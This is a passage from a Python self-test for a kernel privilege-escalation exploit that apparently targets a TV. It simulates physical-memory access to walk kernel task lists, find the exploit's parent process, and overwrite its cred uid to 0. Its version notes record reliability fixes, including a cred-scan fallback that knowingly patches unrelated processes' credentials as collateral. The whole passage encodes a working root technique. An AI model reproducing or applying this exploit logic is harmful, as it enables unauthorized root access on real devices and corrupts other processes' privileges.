    plant_task(rpc_mix, p_stale, b"init", cred_stale)
    plant_task(rpc_mix, p_live, b"PHYSRPT1", cred_live)
    mix_v = plant_task(rpc_mix, c_mix, b"PHYRFORK", cred_stale,
                       parent_phys=p_live, real_parent_phys=p_stale)
    failed += not _check(
        "child_parent_uid 2F4 5001 beats 2F0 zeros",
        child_parent_uid(rpc_mix, mix_v) == OWNER_UID,
        "either parent pointer being ours is enough",
    )

    # parent == child is not a kptr walk, it is a cycle. Skip it.
    rpc5.write32(child_p + O_REAL_PARENT, cv)
    rpc5.write32(child_p + O_PARENT, cv)
    failed += not _check(
        "child_parent_uid skips parent==child",
        child_parent_uid(rpc5, cv) == UNREADABLE,
        "a self-parent pointer is not a cred",
    )

    # LPAE high-half parent (virt 0xE0xxxxxx). trap 5 used to drop these.
    rpc_hi = MemRPC()
    hi_parent, hi_child, hi_cred_p = 0x40100000, 0x40101000, 0x40102000
    plant_cred(rpc_hi, hi_cred_p, uid=5001, gid=100, usage=4)
    plant_task(rpc_hi, hi_parent, b"PHYSRPT1", hi_cred_p)
    hi_cv = plant_task(rpc_hi, hi_child, b"PHYRFORK", hi_cred_p,
                       parent_phys=hi_parent)
    failed += not _check(
        "child_parent_uid LPAE parent above 0xE0000000",
        kptr(hi_cv) and (hi_parent + PHYS_OFF) > 0xE0000000
        and child_parent_uid(rpc_hi, hi_cv) == OWNER_UID,
        f"parent virt {(hi_parent + PHYS_OFF):#x}",
    )

    # Unreadable parent cred page: CredUid -> 0xFFFFFFFF, v22 still latches.
    rpc_un = MemRPC()
    up, uc, u_cred = 0x20800000, 0x20801000, 0x20802000
    plant_cred(rpc_un, u_cred, uid=5001, gid=100, usage=4)
    plant_task(rpc_un, up, b"PHYSRPT1", u_cred)
    uv = plant_task(rpc_un, uc, b"PHYRFORK", u_cred, parent_phys=up)
    rpc_un.holes.add(u_cred & ~0xFFF)
    un_uid = child_parent_uid(rpc_un, uv)
    failed += not _check(
        "child_parent_uid unreadable cred still latchable",
        un_uid == UNREADABLE and latch_new_phyrfork([un_uid]) == 0,
        f"uid={un_uid:#x} is the v22 maybe= path, not skip-orphan-and-drop",
    )

    # Full hunt walk. Tail is the new uid-0 landmark; next is last round's
    # orphan whose parent already reads 5001. Without `pre` the last match
    # is the orphan (ours). With `pre` it is the new child (maybe).
    rpc_h = MemRPC()
    init_p = 0x20900000
    new_p, old_p = 0x20901000, 0x20902000
    new_parent, old_parent = 0x20903000, 0x20903800
    c_new = plant_cred(rpc_h, 0x20904000, uid=0, gid=0, usage=4)
    c_old = plant_cred(rpc_h, 0x20905000, uid=5001, gid=100, usage=4)
    plant_task(rpc_h, new_parent, b"PHYSRPT1", c_new)
    plant_task(rpc_h, old_parent, b"PHYSRPT1", c_old)
    new_v = plant_task(rpc_h, new_p, b"PHYRFORK", c_new, parent_phys=new_parent)
    old_v = plant_task(rpc_h, old_p, b"PHYRFORK", c_old, parent_phys=old_parent)
    init_v = link_tasks_prev(rpc_h, init_p, [new_p, old_p])
    child_nopre, seen_n, skip_n = hunt_new_phyrfork(rpc_h, init_p, init_v, pre=set())
    child_pre, seen_p, skip_p = hunt_new_phyrfork(
        rpc_h, init_p, init_v, pre={old_v})
    failed += not _check(
        "hunt without pre latches the older 5001 orphan",
        child_nopre == old_v and seen_n == 2,
        f"child={child_nopre:#x} old={old_v:#x} seen={seen_n} skip={skip_n}",
    )
    failed += not _check(
        "hunt with pre latches the new uid-0 landmark",
        child_pre == new_v and seen_p == 1 and skip_p == 1,
        f"child={child_pre:#x} new={new_v:#x} seen={seen_p} skip={skip_p} "
        "(v21 would have left child=0 here)",
    )
    # v22 dropped this (cold boot attempt 1: seen=1 skip-orphan=1, child=0).
    # v23 latches it; PatchCred still refuses the write until uid is 5001.
    plant_cred(rpc_h, c_new, uid=1234, gid=1000, usage=4)
    child_f, seen_f, skip_f = hunt_new_phyrfork(
        rpc_h, init_p, init_v, pre={old_v})
    failed += not _check(
        "hunt latches a foreign-looking new landmark (v23)",
        child_f == new_v and seen_f == 1 and skip_f == 1,
        f"child={child_f:#x} new={new_v:#x} seen={seen_f} skip={skip_f}",
    )

    # v17 cache alias: write is visible in the mapping, kernel RAM is not,
    # until flush. Without DropPages the next read still sees the mapping.
    aliased = AliasedMemRPC()
    a_cred = plant_cred(aliased, 0x20A00000, uid=5001, gid=100, usage=4)
    aliased.drop_pages()
    ok_patch = K.patch_ours(aliased, a_cred + PHYS_OFF)
    mapped_uid = aliased.read_u32(a_cred + O_UID)
    kern_uid = aliased.kernel_u32(a_cred + O_UID)
    failed += not _check(
        "patch without flush is mapping-only (v17)",
        ok_patch and mapped_uid == 0 and kern_uid == OWNER_UID,
        f"mapping uid={mapped_uid} kernel uid={kern_uid} — getuid() would still be 5001",
    )
    aliased.flush()
    failed += not _check(
        "flush makes getuid() see the write",
        aliased.kernel_u32(a_cred + O_UID) == 0,
        "cacheflush copies the alias back to kernel RAM",
    )

    # v22 direct-parent retry: mapping still has zeros, kernel already 5001.
    # First PatchCred no-ops (uid 0 = already). DropPages, re-read, then write.
    aliased2 = AliasedMemRPC()
    p2, c2 = 0x20B00000, 0x20B01000
    cred2 = plant_cred(aliased2, 0x20B02000, uid=0, gid=0, usage=4)
    plant_task(aliased2, p2, b"PHYSRPT1", cred2)
    c2v = plant_task(aliased2, c2, b"PHYRFORK", cred2, parent_phys=p2)
    aliased2.drop_pages()
    first_uid = child_parent_uid(aliased2, c2v)          # maps zeros
    aliased2.poke_kernel(cred2 + O_UID, struct.pack("<I", OWNER_UID))
    still_stale = child_parent_uid(aliased2, c2v)        # still the mapping
    patched_stale = K.patch_ours(aliased2, cred2 + PHYS_OFF)
    aliased2.drop_pages()
    after_drop = child_parent_uid(aliased2, c2v)
    patched_live = K.patch_ours(aliased2, cred2 + PHYS_OFF)
    aliased2.flush()
    failed += not _check(
        "direct-parent retry after DropPages",
        first_uid == 0 and still_stale == 0 and patched_stale
        and after_drop == OWNER_UID and patched_live
        and aliased2.kernel_u32(cred2 + O_UID) == 0,
        f"stale={still_stale} after_drop={after_drop} "
        "v21 skip-orphan never got this far; v22 re-reads then PatchCred",
    )

    # ---- Fifth pass: cold-boot attempt-1 replica (docs/OPEN-ISSUES.md) --------
    # The fork child's task page reads coherently (published - the walk found
    # it, as on the TV), the RUNNING parent's task and cred pages do not: their
    # kernel dirty lines never write back and a non-aliasing physmap mapping
    # reads stale zeros.  This is the v23 attempt-1 beacon shape end to end:
    # child latched, no direct-parent beacon, `fail round`, nothing written.
    def stale_scene():
        s = ReadStaleRPC()
        ip = 0x20B80000
        pp, cp = 0x20C00000, 0x20C01000
        pcr, ccr = 0x20C02000, 0x20C03000
        # kernel view only: the running parent's task + cred pages stay hot
        s.kernel_write(pp + O_COMM, b"PHYSRPT1\0")
        s.kernel_write(pp + O_CRED, struct.pack("<I", (pcr + PHYS_OFF) & 0xFFFFFFFF))
        s.kernel_write(pp + O_REAL_CRED, struct.pack("<I", (pcr + PHYS_OFF) & 0xFFFFFFFF))
        s.kernel_write(pcr + O_USAGE, struct.pack("<I", 4))
        s.kernel_write(pcr + O_UID, struct.pack("<8I", *OWNER_IDS))
        plant_task(s, cp, b"PHYRFORK", ccr, parent_phys=pp)   # fork-fresh: published
        plant_cred(s, ccr, usage=4)                           # fork-fresh: published
        iv = link_tasks_prev(s, ip, [cp])
        return s, ip, iv, pp, cp, pcr, ccr

    s1, ip1, iv1, pp1, cp1, pcr1, ccr1 = stale_scene()
    pp1v = (pp1 + PHYS_OFF) & 0xFFFFFFFF
    b1: list[str] = []
    child1, seen1, _skip1 = hunt_new_phyrfork(s1, ip1, iv1, pre=set())
    rooted1, probes1 = direct_parent_patch(s1, child1, beacon=b1.append)
    cu1 = cred_uid(s1, s1.read_u32(cp1 + O_CRED))
    failed += not _check(
        "attempt-1 replica: hunt finds the child, early break, gate stays closed",
        child1 == ((cp1 + PHYS_OFF) & 0xFFFFFFFF) and not rooted1
        and len(probes1) == 2 and all(p[0] == 0 for p in probes1),
        f"child={child1:#x} seen={seen1} probes={len(probes1)} "
        f"prs={[p[0] for p in probes1]} "
        f"beacons={[b.split()[0] for b in b1][:4]}",
    )
    failed += not _check(
        "attempt-1 replica: probe names the stale parent pages, child cred reads 5001",
        probes1[0][3] == 0 and probes1[0][4] == UNREADABLE and cu1 == OWNER_UID,
        f"cred={probes1[0][3]:#x} uid={uid_word(probes1[0][4])} cuid={uid_word(cu1)}",
    )
    failed += not _check(
        "attempt-1 replica: kernel view untouched (getuid still 5001)",
        kernel_uid(s1, pp1v) == OWNER_UID,
        "nothing was written behind the closed gate",
    )

    s1.publish()   # the v24 alias-correct mapping / the line finally wrote back
    b2: list[str] = []
    rooted2, probes2 = direct_parent_patch(s1, child1, beacon=b2.append)
    failed += not _check(
        "publish (the v24 alias-correct mapping) roots on the first retry",
        rooted2 and not probes2 and kernel_uid(s1, pp1v) == 0,
        f"beacons={[b for b in b2 if b.startswith('direct')]}",
    )

    # The diagnostic separates the causes the Fifth pass lists: a coherent
    # foreign cred reads its number and is refused...
    s3 = ReadStaleRPC()
    p3, c3 = 0x20D00000, 0x20D01000
    cr3 = plant_cred(s3, 0x20D02000, uid=1234, gid=1000, usage=4)
    plant_task(s3, p3, b"PHYSRPT1", cr3)
    cv3 = plant_task(s3, c3, b"PHYRFORK", cr3, parent_phys=p3)
    rooted3, probes3 = direct_parent_patch(s3, cv3, beacon=lambda _m: None)
    failed += not _check(
        "direct-parent probe refuses a foreign cred (v15 gate)",
        not rooted3 and probes3 and probes3[0][4] == 1234
        and s3.read_u32(cr3 + O_UID) == 1234,
        f"probe uid={uid_word(probes3[0][4])}, cred untouched",
    )
    # ...an unreadable cred PAGE keeps a valid cred pointer but reads unread...
    s4 = ReadStaleRPC()
    p4, c4 = 0x20E00000, 0x20E01000
    cr4 = 0x20E02000
    plant_cred(s4, cr4, usage=4)
    plant_task(s4, p4, b"PHYSRPT1", cr4)
    cv4 = plant_task(s4, c4, b"PHYRFORK", cr4, parent_phys=p4)
    s4.holes.add(cr4 & ~0xFFF)
    rooted4, probes4 = direct_parent_patch(s4, cv4, beacon=lambda _m: None)
    failed += not _check(
        "direct-parent probe: unreadable cred page keeps cred=valid, uid=unread",
        not rooted4 and probes4 and probes4[0][3] != 0
        and probes4[0][4] == UNREADABLE,
        f"cred={probes4[0][3]:#x} uid={uid_word(probes4[0][4])} - distinct from "
        "the stale-page case where cred=0",
    )
    # ...and a stale read of 0 is refused too: the parent task page is
    # published so the cred pointer reads fine, but the cred page's kernel line
    # never wrote back, so the physmap view holds stale zeros while getuid()
    # still reads 5001.  PatchCred requires 5001 - a 0 read never opens the gate.
    s5 = ReadStaleRPC()
    p5, c5 = 0x20F00000, 0x20F01000
    pcr5, ccr5 = 0x20F02000, 0x20F03000
    plant_task(s5, p5, b"PHYSRPT1", pcr5)                     # parent task published
    s5.kernel_write(pcr5 + O_USAGE, struct.pack("<I", 4))
    s5.kernel_write(pcr5 + O_UID, struct.pack("<8I", *OWNER_IDS))
    plant_task(s5, c5, b"PHYRFORK", ccr5, parent_phys=p5)     # fork-fresh: published
    plant_cred(s5, ccr5, usage=4)
    rooted5, probes5 = direct_parent_patch(s5, (c5 + PHYS_OFF) & 0xFFFFFFFF,
                                           beacon=lambda _m: None)
    failed += not _check(
        "stale uid-0 read refused: cred pointer valid, kernel view still 5001",
        not rooted5 and probes5 and probes5[0][3] == (pcr5 + PHYS_OFF) & 0xFFFFFFFF
        and probes5[0][4] == 0
        and kernel_uid(s5, (p5 + PHYS_OFF) & 0xFFFFFFFF) == OWNER_UID,
        f"probe cred={probes5[0][3]:#x} uid={uid_word(probes5[0][4])}, "
        "nothing written",
    )

    # v28 cred-scan fallback (docs/OPEN-ISSUES.md, cold boot on v27): the
    # parent task's cred-pointer line reads stale, but cred pages read
    # coherently and our cred is a cred_jar neighbour of the child's fork copy.
    # Scene: parent task kernel-planted (stale view: cred pointer unreadable);
    # on our cred's page, a foreign live uid-5001 cred at a lower address
    # (patched first - the documented collateral), our cred (published, or
    # kernel-view-only for the hot-line worst case), a freed cred whose usage
    # is overwritten by the SLUB freelist pointer, and the child's fork copy.
    def scan_scene(ours_visible: bool):
        s = ReadStaleRPC()
        ip = 0x21000000
        pp, cp = 0x21100000, 0x21101000
        our_cred, ccr = 0x21102800, 0x21103000
        foreign_cred, freed_cred = 0x21102000, 0x21103400
        s.kernel_write(pp + O_COMM, b"PHYSRPT1\0")
        s.kernel_write(pp + O_CRED, struct.pack("<I", (our_cred + PHYS_OFF) & 0xFFFFFFFF))
        s.kernel_write(pp + O_REAL_CRED, struct.pack("<I", (our_cred + PHYS_OFF) & 0xFFFFFFFF))
        # the foreign cred goes in first so it sits lower on the page than ours
        plant_cred(s, foreign_cred, uid=OWNER_UID, gid=OWNER_GID, usage=2)
        if ours_visible:
            plant_cred(s, our_cred, usage=4)
        else:
            # hot-line worst case: our cred page is kernel-view-only, the
            # physmap read of it stays stale
            s.kernel_write(our_cred + O_USAGE, struct.pack("<I", 4))
            s.kernel_write(our_cred + O_UID, struct.pack("<8I", *OWNER_IDS))
        plant_task(s, cp, b"PHYRFORK", ccr, parent_phys=pp)
        plant_cred(s, ccr, usage=4)
        s.write32(freed_cred + O_USAGE, 0xDEADBEEF)
        s.write(freed_cred + O_UID, struct.pack("<8I", *OWNER_IDS))
        iv = link_tasks_prev(s, ip, [cp])
        pv = (pp + PHYS_OFF) & 0xFFFFFFFF
        return s, pv, our_cred, ccr, foreign_cred, freed_cred

    s7, pv7, ocr7, ccr7, _fcr7, xcr7 = scan_scene(ours_visible=True)
    rooted7, patched7 = cred_scan_near(
        s7, ccr7, exclude_phys=ccr7,
        is_rooted=lambda: kernel_uid(s7, pv7) == 0)
    failed += not _check(
        "cred-scan roots us past a stale cred-pointer line",
        rooted7 and kernel_uid(s7, pv7) == 0 and patched7 == 2,
        f"patched={patched7} (foreign neighbour first, then ours)",
    )
    failed += not _check(
        "cred-scan never touches the child's own cred",
        struct.unpack("<8I", s7.read(ccr7 + O_UID, 32))
        == (OWNER_UID, OWNER_GID) * 4,
        "the fork copy is excluded by address",
    )
    failed += not _check(
        "cred-scan skips a freed cred (SLUB freelist pointer in usage)",
        s7.read_u32(xcr7 + O_USAGE) == 0xDEADBEEF,
        "SaneCred's usage bound rejects it",
    )
    # hot-line worst case: our cred page reads stale too - the scan patches the
    # neighbour for nothing and reports a miss instead of looping
    s8, pv8, _ocr8, ccr8, _fcr8, _xcr8 = scan_scene(ours_visible=False)
    rooted8, patched8 = cred_scan_near(
        s8, ccr8, exclude_phys=ccr8,
        is_rooted=lambda: kernel_uid(s8, pv8) == 0)
    failed += not _check(
        "cred-scan misses cleanly when our cred page is stale too",
        not rooted8 and patched8 == 1
        and kernel_uid(s8, pv8) == OWNER_UID,
        f"patched={patched8} (the neighbour, then a clean miss)",
    )
    # v30 fidelity: the C# budget is process-wide, not per scan.  Ten foreign
    # creds must stop at 8, and a second scan sharing the budget is a no-op.
    s9 = ReadStaleRPC()
    for i in range(10):
        plant_cred(s9, 0x21200000 + i * 0x100, usage=2)
    budget9 = [0]
    rooted9, patched9 = cred_scan_near(
        s9, 0x21201000, exclude_phys=0x21201000,
        is_rooted=lambda: False, budget=budget9)
    rooted9b, patched9b = cred_scan_near(
        s9, 0x21201000, exclude_phys=0x21201000,
        is_rooted=lambda: False, budget=budget9)
    failed += not _check(
        "cred-scan stops at the process-wide MaxPatched budget",
        not rooted9 and patched9 == 8 and budget9[0] == 8
        and not rooted9b and patched9b == 0,
        f"patched={patched9} total={budget9[0]} second={patched9b} "
        "(10 foreign creds; budget 8, shared across calls)",
    )
    # v30 fidelity: a cred whose ids start exactly at a page boundary puts a
    # pattern hit at page offset 0 (cred at page-4).  That hit is still refused,
    # but it must not close the page: a later cred on the same page has to be
    # seen.  The old `while off >= 4` aborted the page at the offset-0 hit.
    s10 = ReadStaleRPC()
    cred10a = 0x21201FFC                   # ids at 0x21202000 (hit at offset 0)
    cred10b = 0x21202400                   # later, still inside page 0x21202000
    plant_cred(s10, cred10a, usage=2)
    plant_cred(s10, cred10b, usage=2)
    rooted10, patched10 = cred_scan_near(
        s10, 0x21203000, exclude_phys=0x21203000,
        is_rooted=lambda: False)
    failed += not _check(
        "cred-scan skips an offset-0 hit without closing the page",
        not rooted10 and patched10 == 1
        and cred_uid(s10, (cred10b + PHYS_OFF) & 0xFFFFFFFF) == 0
        and cred_uid(s10, (cred10a + PHYS_OFF) & 0xFFFFFFFF) == OWNER_UID,
        f"patched={patched10} (later cred patched, pre-page cred left alone)",
    )

    # v20: reopen AFTER fork while the child still holds the fd.
    v20 = Video40()
    failed += not _check(
        "video40 sole opener",
        v20.open() == 0 and v20.open() == -1,
        "second open fails while held",
    )
    v20.close()
    v21 = Video40()
    v21.open()
    v21.close()               # ReopenVideo before fork: drop then grab
    failed += not _check(
        "reopen BEFORE fork (v21)",
        v21.open() == 0,
        "parent is the sole opener, then fork copies it",
    )
    v21.fork()
    v20b = Video40()
    v20b.open()
    v20b.fork()               # child inherits
    v20b.close()              # parent drops its copy
    failed += not _check(
        "reopen AFTER fork (v20) fails",
        v20b.open() == -1 and v20b.n == 1,
        "child still holds the one RDWR opener; hunt then runs with fd=-1",
    )

    print(flush=True)
    if failed:
        print(f"{failed} check(s) failed", flush=True)
        return 1
    print("sim_rpc self-test ok", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(selftest())
